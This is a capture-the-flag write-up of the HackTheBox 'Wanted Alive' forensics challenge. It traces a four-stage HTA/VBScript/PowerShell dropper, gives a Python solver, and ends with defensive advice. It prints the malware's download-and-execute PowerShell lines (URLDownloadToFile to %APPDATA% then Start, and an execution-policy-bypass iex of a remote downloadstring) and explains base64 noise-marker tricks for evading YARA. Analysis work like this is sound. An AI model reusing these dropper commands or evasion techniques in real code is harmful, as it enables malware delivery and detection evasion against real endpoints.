---
layout: post
title: "HTB Challenge: Wanted Alive"
date: 2027-08-19 09:00:00 -0500
categories: [HackTheBox, Challenges, Forensics]
tags: [hackthebox, challenge, forensics, malware-analysis, hta, vbscript, powershell, url-encoding, base64, cwe-829, cwe-506]
---

A 4-stage Windows malware dropper disguised as an `.hta` file — peel back layers of URL-encoding, extract an obfuscated VBScript stager, strip a noise-marker base64 payload, and follow the C2 chain to the flag.

## Overview

*Wanted Alive* is an HTB Forensics challenge (Easy) built around a realistic Windows malware dropper chain. The artifact is a single `.hta` (HTML Application) file that hides a four-hop stager using multi-layer JavaScript URL-encoding, a VBScript [`URLDownloadToFile`](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85)) downloader, and a base64 payload with embedded noise markers designed to defeat YARA signature rules. The challenge mirrors real-world phishing tradecraft against legacy Windows endpoints.

## The technique

### Stage 1 — HTA with recursive URL-encoding

HTML Applications (`.hta`) run under `mshta.exe` with full Windows Scripting Host privileges — outside the browser sandbox, with access to the full Win32 API. The `wanted.hta` file is a single 206 KB line. Its JavaScript sets:

```js
m = '<deeply %-encoded blob>';
document.write(unescape(m));
```

The blob is recursively URL-encoded: each pass of `unescape()` produces another encoded string, not the final payload. To recover the plaintext in Python, apply `unquote()` until the value stabilises:

```python
from urllib.parse import unquote
val = re.search(r"m='([^']+)'", hta).group(1)
prev = None
while prev != val:
    prev = val
    val = unquote(val)
```

The stabilised output is a VBScript body containing the next stager.

### Stage 2 — VBScript PowerShell stager via URLDownloadToFile

The decoded VBScript creates `WScript.Shell` (obfuscated as `Chr(&H57) & "SCRIPT.shELL"`) and calls a PowerShell one-liner that uses `Add-Type` to P/Invoke `URLDownloadToFile` from `urlmon.dll`:

```powershell
$ea6c8mrT = Add-Type -MemberDefinition '[DllImport("urlmon.dll")]public static extern IntPtr URLDownloadToFile(...)' -Name "..." -PassThru
$ea6c8mrT::URLDownloadToFile(0, "http://wanted.alive.htb/35/wanted.tIF", "$env:APPDATA\wanted.vbs", 0, 0)
Start "$env:APPDATA\wanted.vbs"
```

This is embedded as a base64 string inside the VBScript body. Extract and decode it:

```python
ps1 = base64.b64decode(re.search(r"\+'([A-Za-z0-9+/]{100,}=*)'", val).group(1)).decode()
path2 = re.search(r'"(http://wanted\.alive\.htb[^"]+)"', ps1).group(1).split('htb')[1]
# path2 = /35/wanted.tIF
```

No integrity check is performed on the downloaded file — a classic [inclusion of functionality from an untrusted control sphere (CWE-829)](https://cwe.mitre.org/data/definitions/829.html).

### Stage 3 — VBScript C2 implant with noise-marker base64

`wanted.tIF` is served as `image/tiff` but is actually a VBScript (the legitimate Windows `winrm.vbs` used as camouflage). Embedded inside it is a second PowerShell command, stored in a variable `latifoliado` as base64 chunks interleaved with a repeating noise marker:

```vbscript
latifoliado = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNld2FudGVkCg..."
latifoliado = latifoliado & "XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sd2FudGVkCg..."
```

The noise marker `d2FudGVkCg` is the base64 encoding of the ASCII string `wanted\n`. It is injected between every chunk to break naive grep/YARA rules that look for long base64 runs. Stripping it and decoding recovers the third-stage PowerShell:

```python
parts = re.findall(r'latifoliado = "([^"]+)"', vbs) + \
        re.findall(r'latifoliado = latifoliado & "([^"]+)"', vbs)
ps2 = base64.b64decode(''.join(parts).replace('d2FudGVkCg', '') + '==').decode()
```

Decoded:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [...]::SecurityProtocol -bor 3072
iex ([System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String(
        (New-Object system.net.webclient).downloadstring(
            'http://wanted.alive.htb/cdba/_rp'))))
```

### Stage 4 — C2 beacon

A `GET /cdba/_rp` to the challenge server returns the flag directly. No further encoding.

## Solution

```python
#!/usr/bin/env python3
from urllib.parse import unquote
from urllib.request import urlopen
import base64, re, sys

DOCKER = sys.argv[1]  # ip:port of the spawned challenge instance

# Stage 1: peel recursive URL-encoding from the HTA m= blob
with open('files/wanted.hta') as f:
    hta = f.read()
val = re.search(r"m='([^']+)'", hta).group(1)
prev = None
while prev != val:
    prev = val
    val = unquote(val)

# Stage 2: extract base64 PowerShell → find URLDownloadToFile target
ps1 = base64.b64decode(re.search(r"\+'([A-Za-z0-9+/]{100,}=*)'", val).group(1)).decode()
path2 = re.search(r'"(http://wanted\.alive\.htb[^"]+)"', ps1).group(1).split('htb')[1]

# Stage 3: download wanted.tIF, strip noise marker, decode second PS
vbs = urlopen(f"http://{DOCKER}{path2}").read().decode()
parts = re.findall(r'latifoliado = "([^"]+)"', vbs) + \
        re.findall(r'latifoliado = latifoliado & "([^"]+)"', vbs)
ps2 = base64.b64decode(''.join(parts).replace('d2FudGVkCg', '') + '==').decode()
path3 = re.search(r"'(http://wanted\.alive\.htb[^']+)'", ps2).group(1).split('htb')[1]

# Stage 4: fetch final C2 response
print(urlopen(f"http://{DOCKER}{path3}").read().decode())
# → HTB{...}
```

## Why it worked

Each stage exploits a distinct trust assumption:

1. **HTA execution** — `mshta.exe` runs `.hta` files with scripting host privileges; no browser sandbox, no Mark-of-the-Web prompt on legacy IE/Windows configurations.
2. **`URLDownloadToFile`** — fetches and saves arbitrary code with no signature or hash check ([CWE-829](https://cwe.mitre.org/data/definitions/829.html)).
3. **Filetype spoofing** — a `.tIF` extension with `Content-Type: image/tiff` disguises the VBScript payload from casual inspection and some AV heuristics.
4. **Noise-marker obfuscation** — splitting base64 with a fixed string (`d2FudGVkCg`) defeats single-run YARA rules looking for long base64 sequences. This is a form of [improper encoding or escaping (CWE-116)](https://cwe.mitre.org/data/definitions/116.html) used deliberately to evade detection.

## Fix / defense

- **Block `mshta.exe`** via AppLocker or Windows Defender Application Control (WDAC) — HTML Applications have no legitimate use on managed endpoints and are a common initial-access vehicle.
- **Monitor `urlmon.dll` P/Invoke from script hosts** (`wscript.exe`, `cscript.exe`, `mshta.exe`) — `URLDownloadToFile` calls from scripting engines are high-fidelity malware indicators. Sysmon Event ID 11 (file creation) + Event ID 3 (network connect) from these processes.
- **Alert on `WScript.Shell.Run` + PowerShell `-EncodedCommand`/`-C iex(...)`** in EDR telemetry — the combination of a script host spawning an encoded PowerShell is almost exclusively malicious.
- **Require signed code for execution** — enforce WDAC allow-listing so only signed binaries run; unsigned VBScript from a temp path (`%APPDATA%\wanted.vbs`) would be blocked before execution.
